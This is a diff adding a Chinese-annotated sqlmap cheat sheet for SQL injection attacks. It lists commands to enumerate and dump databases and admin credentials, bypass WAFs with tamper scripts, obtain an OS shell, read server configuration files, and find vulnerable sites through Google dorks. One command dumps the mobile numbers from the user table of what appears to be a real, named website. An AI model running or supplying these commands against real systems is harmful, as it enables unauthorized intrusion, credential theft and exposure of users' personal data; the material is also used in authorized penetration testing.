@@ -1,0 +1,60 @@
+cd /usr/share/sqlmap
+
+python sqlmap.py -u url
+
+sqlmap.py -u "目录" --batch --crawl 3 --smart --threads 10
+
+sqlmap.py -u "url"     检测存在不存在注入
+sqlmap.py -u "url" --tables     列出数据库的表
+sqlmap.py -u "url" --columns -T admin     列出admin的内容
+sqlmap.py -u "url" --dump -T admin "useradmin,password"     列出useradmin password的内容
+
+--proxy "http://120.198.243.79:80"        解决proxy
+ 
+ 
+--tamper "space2morehash.py" -v 3  SQLMap绕过WAF  
+--tamper "space2mssqlblank" -v 3  Mysql 伪静态注入 
+
+
+--random-agent   加头部
+ 
+--level 3 --referer="a" --random-agent	
+
+
+sqlmap.py -u url --dbms "Mysql" --current-db 当前数据库
+sqlmap.py -u "url" --dbs     列出数据库
+sqlmap.py -u "url" -D xxxx --tables     列出指定数据库的表
+sqlmap.py -u "url" -D xxxx -T xxx --columns     列出指定表的内容
+sqlmap.py -u "url" -D xxxx -T xxx -C xxx,aaa --dump     列出指定字段xxx和aaa的的内容
+sqlmap.py -u "www.xxx.com/index.php" --cokies "id=7"     --tables 用cookies方式列出数据库的表
+sqlmap.py -u "www.xxx.com/index.php" --data "user=1&pass=1" --dbs     指定post参数注入出数据库
+sqlmap.py -u "www.xxx.com/index.php" --forms     sqlmap自动查找网页上的表单，并注入
+
+
+sqlmap.py -r 1.txt -p user     用burp抓包，保存为1.txt 然后用-r参数注入，用-p参数来指定网页上的参数
+运行sqlmap并使用如下命令：./sqlmap.py -r search-test.txt -p tfUPass，这里参数 -r 是让sqlmap加载我们的post请求rsearch-test.txt，而-p 大家应该比较熟悉，指定注入用的参数。 注意-p 后面的参数是否打错
+
+
+
+
+
+sqlmap.py -u "url"  --os-cmd=ipconfig     执行ipconfig命令，必须有足够的权限
+sqlmap.py -u "url"  --os-shell     获得一个shell     会在网站目录下生成两个文件，一个是tmpbxbxz.php他是来运行shell的。 一个是tmpuoiuz.php他是来上传文件的
+
+sqlmap.py --dump -D 数据库 -T 表     拖库
+ 
+sqlmap.py -u 注入地址 --privileges 查看权限
+ 
+
+sqlmap.py -g "inurl:\".php?id=1\""    处理Google的搜索结果 
+
+
+sqlmap -u url --file-read 'C:\Windows\System32\inetsrv\config\applicationHost.config'  读文件 
+
+
+前100条数据
+-u http://www.hongzhoukan.com/hlc_video_content.php?id=53 --dump  -D hzk -T hk_user  -C mobile  -start 1 -stop 100
+使用自定义user-agent,或者使用随机使用自带的user-agents.txt
+python sqlmap.py -u “http://www.91ri.org/ /sqlmap/oracle/get_int.php?id=1″ –user-agent “Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)” -v 3
+
+ 
